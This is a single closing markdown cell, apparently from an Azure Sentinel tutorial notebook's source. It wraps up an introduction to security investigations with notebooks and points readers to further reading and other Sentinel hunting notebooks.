        "This notebook has showed you the basics of using notebooks and Azure Sentinel for security investigaitons. There are many more things possible using notebooks and it is stronly encouraged to read the material we have referenced in the learn more sections in this notebook. You can also explore the other Azure Sentinel notebooks in order to take advantage of the pre-built hunting logic, and understand other analysis techniques that are possible. </br>\n",
